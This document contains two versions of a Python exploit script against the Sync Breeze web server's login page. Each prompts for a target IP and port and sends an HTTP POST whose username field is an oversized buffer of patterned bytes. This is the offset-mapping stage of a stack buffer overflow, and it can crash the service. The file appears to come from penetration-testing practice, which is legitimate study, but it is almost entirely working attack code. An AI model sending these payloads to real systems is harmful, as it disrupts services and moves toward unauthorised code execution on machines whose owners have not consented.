#!/usr/bin/python3

import sys,socket
from time import sleep 
print("***********SYNC_BREEZE Vulnerability***********")
sleep(0.5)
ip_address=input("Enter the IP address\n")
port_number=input("Enter Port number\n")

if (len(ip_address)<=0) or (len(port_number)<=0):
    if (len(ip_address)>0) and (len(port_number)<=0):
        print("Port number field is empty")
    elif (len(ip_address)<=0) and (len(port_number)>0):
        print("IP address field is empty")
    else:
        print("Issues with the user input")
elif (len(ip_address)>0) and (len(port_number)>0):
    print("*********************************************")
    size=b"A" * 780 + b"B" * 4 + b"C" * (800-780-4)
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip_address, int(port_number)))
    buff=b"username=" +  size + b"&password=A"

    buffer=b"POST /login HTTP/1.1\r\n"
    buffer+=b"Host: 192.168.100.211\r\n"
    buffer+=b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\r\n"
    buffer+=b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
    buffer+=b"Accept-Language: en-US,en;q=0.5\r\n"
    buffer+=b"Accept-Encoding: gzip, deflate\r\n"
    buffer+=b"Content-Type: application/x-www-form-urlencoded\r\n"
    buffer+=b"Content-Length: "+str(len(buff)).encode('utf-8')+b"\r\n"
    buffer+=b"Origin: http://192.168.100.211\r\n"
    buffer+=b"Connection: keep-alive\r\n"
    buffer+=b"Referer: http://192.168.100.211/login\r\n"
    buffer+=b"\r\n"
    buffer=buffer+buff
    s.send((buffer))
    s.close()
  -----------------------------------------------------------------------------------------------------------------------------------------------------
#!/usr/bin/python3

import sys,socket
from time import sleep 
print("***********SYNC_BREEZE Vulnerability***********")
sleep(0.5)
ip_address=input("Enter the IP address\n")
port_number=input("Enter Port number\n")

if (len(ip_address)<=0) or (len(port_number)<=0):
    if (len(ip_address)>0) and (len(port_number)<=0):
        print("Port number field is empty")
    elif (len(ip_address)<=0) and (len(port_number)>0):
        print("IP address field is empty")
    else:
        print("Issues with the user input")
elif (len(ip_address)>0) and (len(port_number)>0):
    print("*********************************************")
    size=900
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip_address, int(port_number)))

    size=b"A" * 780 + b"B" * 4 + b"C" * 4 + b"D" *(1200-4-4-780)

    buff=b"username=" + size + b"&password=A"

    buffer=b"POST /login HTTP/1.1\r\n"
    buffer+=b"Host: 192.168.100.211\r\n"
    buffer+=b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\r\n"
    buffer+=b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
    buffer+=b"Accept-Language: en-US,en;q=0.5\r\n"
    buffer+=b"Accept-Encoding: gzip, deflate\r\n"
    buffer+=b"Content-Type: application/x-www-form-urlencoded\r\n"
    buffer+=b"Content-Length: "+str(len(buff)).encode('utf-8')+b"\r\n"
    buffer+=b"Origin: http://192.168.100.211\r\n"
    buffer+=b"Connection: keep-alive\r\n"
    buffer+=b"Referer: http://192.168.100.211/login\r\n"
    buffer+=b"\r\n"
    buffer=buffer+buff
    s.send((buffer))
    s.close()
